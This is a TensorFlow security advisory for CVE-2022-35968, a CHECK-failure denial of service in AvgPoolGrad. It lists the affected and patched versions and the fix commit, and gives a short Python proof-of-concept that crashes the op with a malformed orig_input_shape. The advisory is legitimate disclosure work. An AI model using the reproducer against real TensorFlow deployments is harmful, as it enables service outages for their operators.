{
    "Title": "TensorFlow vulnerable to `CHECK` fail in `AvgPoolGrad`",
    "Meta": {
        "Package": [
            "tensorflow([pip](/advisories?query=ecosystem%3Apip))"
        ],
        "Affected versions": [
            "< 2.7.2",
            ">= 2.8.0, < 2.8.1",
            ">= 2.9.0, < 2.9.1"
        ],
        "Patched versions": [
            "2.7.2",
            "2.8.1",
            "2.9.1"
        ]
    },
    "Description": "### Impact\n\nThe implementation of `AvgPoolGrad` does not fully validate the input\n`orig_input_shape`. This results in a `CHECK` failure which can be used to\ntrigger a denial of service attack:\n\n    \n    \n    import tensorflow as tf\n    \n    ksize = [1, 2, 2, 1]\n    strides = [1, 2, 2, 1]\n    padding = \"VALID\"\n    data_format = \"NHWC\"\n    orig_input_shape = tf.constant(-536870912, shape=[4], dtype=tf.int32)\n    grad = tf.constant(.0890338004362538, shape=[1,5,7,1], dtype=tf.float64)\n    tf.raw_ops.AvgPoolGrad(orig_input_shape=orig_input_shape, grad=grad, ksize=ksize, strides=strides, padding=padding, data_format=data_format)\n\n### Patches\n\nWe have patched the issue in GitHub commit\n[3a6ac52664c6c095aa2b114e742b0aa17fdce78f](https://github.com/tensorflow/tensorflow/commit/3a6ac52664c6c095aa2b114e742b0aa17fdce78f).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this\ncommit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these\nare also affected and still in supported range.\n\n### For more information\n\nPlease consult [our security\nguide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for\nmore information regarding the security model and how to contact us with\nissues and questions.\n\n### Attribution\n\nThis vulnerability has been reported by Neophytos Christou, Secure Systems\nLabs, Brown University.\n\n### References\n\n  * [GHSA-2475-53vw-vp25](https://github.com/tensorflow/tensorflow/security/advisories/GHSA-2475-53vw-vp25 \"GHSA-2475-53vw-vp25\")\n  * [tensorflow/tensorflow@`3a6ac52`](https://github.com/tensorflow/tensorflow/commit/3a6ac52664c6c095aa2b114e742b0aa17fdce78f)\n  * <https://github.com/tensorflow/tensorflow/releases/tag/v2.10.0>\n  * <https://nvd.nist.gov/vuln/detail/CVE-2022-35968>\n\n",
    "Severity": {
        "Score": "5.9/ 10 (Moderate)",
        "CVSS base metrics": {
            "Attack vector": "Network",
            "Attack complexity": "High",
            "Privileges required": "None",
            "User interaction": "None",
            "Scope": "Unchanged",
            "Confidentiality": "None",
            "Integrity": "None",
            "Availability": "High"
        },
        "CVSS string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H"
    },
    "Weaknesses": [
        "[CWE-617](/advisories?query=cwe%3A617)"
    ],
    "CVE ID": "CVE-2022-35968",
    "GHSA ID": "GHSA-2475-53vw-vp25",
    "Source code": "[tensorflow/tensorflow](https://github.com/tensorflow/tensorflow)"
}